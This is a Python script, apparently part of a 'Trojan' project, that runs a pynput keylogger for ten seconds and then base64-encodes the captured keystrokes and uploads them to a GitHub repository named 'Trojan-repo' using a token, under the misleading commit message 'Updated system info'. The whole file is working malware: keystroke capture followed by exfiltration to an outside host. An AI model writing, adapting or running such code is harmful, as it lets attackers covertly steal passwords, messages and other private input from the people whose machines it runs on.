from pynput import keyboard
from datetime import datetime
import time
import socket
import platform
import psutil
from datetime import datetime
import os
import json
import requests
import base64
import socket
import threading
import json
from dotenv import load_dotenv

class Keylogger:
    def __init__(self):
        self.log = []  # Store the logged keys in a list
        self.output = ""  # Store all logged keys as a single string
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            # Register character keys (e.g., letters, numbers)
            if hasattr(key, 'char') and key.char is not None:
                self.log.append(key.char)
                self.output += key.char
            else:
                # Register special keys (e.g., Enter, Shift)
                special_key = f"[{key}]"
                self.log.append(special_key)
                self.output += special_key
        except Exception as e:
            self.log_error(f"Error processing key press: {e}")

    def start(self):
        # Start listening for key presses
        self.listener.start()

    def stop(self):
        # Stop the listener when finished
        self.listener.stop()

    @staticmethod
    def log_error(message):
        """Logs errors to a dedicated error file."""
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"{datetime.now()}: {message}\n")

keylogger = Keylogger()

# Example of the Keylogger module
print("Starting keylogger (run for 10 seconds)...")
keylogger.start()

print("Keylogger is running... Press keys to test it.")

# Run the keylogger for 10 seconds for testing purposes
time.sleep(10)

# Stop the keylogger and end the program
keylogger.stop()

print("Keylogger has stopped.")

# Output the captured log
print(f"Captured keystrokes: {keylogger.output}")



# GitHub repository details
repository_owner = "BlertaJashanica"
repository_name = "Trojan-repo"
file_path = "data/keylogger.txt"  # Correct file path with filename
file_content = json.dumps(keylogger.output, indent=4)  # Convert dict to JSON string for GitHub

load_dotenv()  # Load environment variables from .env file
github_token = os.getenv("GITHUB_TOKEN")

commit_message = 'Updated system info'

# GitHub API URL
api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
headers = {
    "Authorization": f"Token {github_token}",
    "Accept": "application/vnd.github.v3+json"
}

# Encode the file content to Base64
file_content_encoded = base64.b64encode(file_content.encode()).decode()

# Check if the file already exists
response = requests.get(api_url, headers=headers)
if response.status_code == 200:
    current_file = response.json()
    sha = current_file["sha"]  # Get the current file's SHA for updates
else:
    sha = None  # File doesn't exist; it will be created

# Prepare the payload for the PUT request
payload = {
    "message": commit_message,
    "content": file_content_encoded,
    "sha": sha
}

# Push the file to GitHub
response = requests.put(api_url, json=payload, headers=headers)
if response.status_code in [200, 201]:
    print("File pushed successfully!")
else:
    print("An error occurred while pushing the file:", response.json())


